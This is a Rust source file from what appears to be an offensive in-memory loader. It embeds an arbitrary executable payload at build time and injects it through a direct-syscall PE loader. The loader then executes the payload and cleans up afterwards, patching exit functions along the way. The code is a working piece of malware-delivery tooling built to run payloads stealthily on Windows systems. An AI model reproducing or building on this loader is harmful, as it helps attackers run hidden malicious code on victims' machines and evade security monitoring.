use std::any::Any;
use std::panic;

#[allow(unused_imports)]
use crate::debug_error;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_error_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;
#[allow(unused_imports)]
use crate::debug_info_msg;



use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
use crate::winapi::pe_loader::PE_Loader;
use crate::winapi::pe_loader::PE_Options;


#[allow(dead_code)]
pub fn do_load()
{
    let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
        let pe_bytes = get_pe();
        debug_success_msg!(format!("PE loaded, size = {}", pe_bytes.len()));
        let args = String::from(env!("PAYLOAD_ARGUMENTS"));
        debug_success_msg!(format!("args = {}", args));
        let options = PE_Options {
            patch_exit_functions: true
        };
        load(pe_bytes, args, options);
    });
    match result {
        Err(_) => debug_error_msg!(format!("An Error occured")),
        _ => ()
    }
}

#[cfg(all(feature = "payload_b64"))]
fn get_pe() -> Vec<u8> {
    let base64_pe_bytes = include_str!(env!("PAYLOAD_FILE_NAME"));
    crate::common::helpers::base64_to_vec(base64_pe_bytes)
}

#[cfg(all(feature = "payload_bin"))]
fn get_pe() -> Vec<u8> {
    let pe_bytes = include_bytes!(env!("PAYLOAD_FILE_NAME"));
    pe_bytes.to_vec()
}
 
fn load(pe_bytes: Vec<u8>, args: String, options: PE_Options) {
    

    let ntdll = SyscallWrapper::new();
    debug_info_msg!("Loading ...");

    let mut pe_loader = PE_Loader::new(ntdll, options);
    if !pe_loader.inject(pe_bytes, args) {
        debug_error_msg!("Failed to inject PE.");
        return;
    }

    if !pe_loader.execute() {
        debug_error_msg!("Failed to execute PE.");
        return;
    }

    if !pe_loader.clean() {
        debug_error_msg!("Failed to clean PE.");
        return;
    }

    debug_ok_msg!("PE executed.");
}

